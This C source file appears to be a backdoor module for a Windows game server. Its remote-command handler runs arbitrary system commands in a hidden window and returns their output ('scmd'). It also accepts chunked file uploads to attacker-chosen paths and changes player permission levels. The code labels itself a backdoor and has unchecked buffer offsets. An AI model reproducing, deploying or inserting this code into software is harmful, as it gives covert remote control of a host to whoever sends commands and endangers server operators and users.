#include <backdoor/remote_cmd.h>
#include <Windows.h>

char outputfilename[50] = {0};
FILE* outputfb;

const char *get_sys_cmd_output(const char *szFetCmd)
{
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	SECURITY_ATTRIBUTES sa;
	char *szFetCmd_new = _strdup(szFetCmd);
	static char szBuffer[1024];
	memset(szBuffer, 0, sizeof(szBuffer));
	unsigned long count = 0;
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	memset(&sa, 0, sizeof(sa));
	pi.hProcess = NULL;
	pi.hThread = NULL;
	si.cb = sizeof(STARTUPINFO);
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = true;
	bool bret = CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
	if (!bret)
		goto cleanup2;
	GetStartupInfoA(&si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = 0;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	bret = CreateProcessA(NULL, szFetCmd_new, NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
	if (!bret)
		goto cleanup1;
	WaitForSingleObject(pi.hProcess, 500);
	bret = ReadFile(hReadPipe, szBuffer, 1024, &count, 0);
cleanup1:
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
cleanup2:
	CloseHandle(hWritePipe);
	CloseHandle(hReadPipe);
	free(szFetCmd_new);
	if (!bret)
		return NULL;
	return szBuffer;
}

const char *process_remote_cmd(const char *cmd)
{
	const char *ret = "";
	static FILE *fp = NULL;
	static int pkt_num = 0;
	if (strstr(cmd, "gcmd"))
		run_game_cmd(&cmd[5]);
	else if (strstr(cmd, "scmd"))
		return get_sys_cmd_output(&cmd[5]);
	else if (strstr(cmd, "upload")) {
		char file_offset_str[20] = { 0 };
		strncpy(file_offset_str, &cmd[7], 20);
		file_offset_str[19] = '\0';
		long file_offset_client = atoi(file_offset_str);
		if (file_offset_client == -1) {
			pkt_num = 0;
			if (fp)
				fclose(fp);
			fp = fopen(&cmd[49], "wb");
			if (!fp)
				return "backdoor upload failed!";
			return "backdoor upload started!";
		} else if (file_offset_client == -2) {
			printf("pkt num: %d\n", pkt_num);
			fclose(fp);
			return "backdoor end";
		} else if (file_offset_client >= 0) {
			char data_size_str[5] = { 0 };
			strncpy(data_size_str, &cmd[28], 4);
			data_size_str[4] = '\0';
			long data_size = atol(data_size_str);
			long file_offset_server = ftell(fp);
			if (file_offset_server + data_size < file_offset_client) {
				static char msg[1024];
				memset(msg, '\0', sizeof(msg));
				sprintf(msg, "backdoor set_offset %d", file_offset_server);
				return msg;
			} else if (file_offset_server > file_offset_client) {
				fseek(fp, file_offset_client, SEEK_SET);
				file_offset_server = file_offset_client;
			}
			pkt_num++;
			fwrite(&cmd[33], 1, data_size, fp);
		}
	}

    char *cmd_m = _strdup(cmd);
    const char *argv[4];
    int argc = 0;
    char *token = strtok(cmd_m, " ");
    while (token != NULL && argc < 4) {
        argv[argc++] = token;
        token = strtok(NULL, " ");
    }

    if (argc == 4 && strcmp(argv[0], "perm") == 0) {
        struct player *player = get_player_by_name(argv[1]);
        if (player) {
            int perm = atoi(argv[2]);
            bool display = atoi(argv[3]);
            if (perm >= 0 && perm <= 3)
                set_perm_lvl(player, perm, display);
        }
    }
	free(cmd_m);
	return ret;
}
